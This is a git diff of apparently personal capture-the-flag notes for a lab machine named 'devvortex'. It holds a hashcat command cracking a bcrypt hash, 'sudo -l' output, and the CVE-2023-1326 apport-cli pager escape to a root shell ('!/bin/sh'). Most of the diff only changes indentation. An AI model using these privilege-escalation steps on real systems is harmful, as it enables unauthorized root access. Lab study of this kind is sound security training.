@@ -196,7 +196,7 @@ linpeas.txt - sudo = 1.8.31
 ```
 
 ```bash
-	Brute force hash ?
+Brute force hash ?
 
 	hashcat -m 3200 "$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12" -a 0 rockyou.txt
 
@@ -211,20 +211,21 @@ linpeas.txt - sudo = 1.8.31
 ```
 
 ```bash
+linpeas.txt - "Do not forget to execute 'sudo -l' without password or with valid"
 	sudo -l
 	User logan may run the following commands on devvortex:
-    	(ALL : ALL) /usr/bin/apport-cli
+		(ALL : ALL) /usr/bin/apport-cli
 
 	https://diegojoelcondoriquispe.medium.com/cve-2023-1326-poc-c8f2a59d0e00
 
-    less /etc/profile
-    !/bin/sh
+	less /etc/profile
+	!/bin/sh
 
-    sudo /usr/bin/apport-cli --file-bug
-    1
-    2
-    ENTER
-    V
+	sudo /usr/bin/apport-cli --file-bug
+	1
+	2
+	ENTER
+	V
 
 	!/bin/bash
 
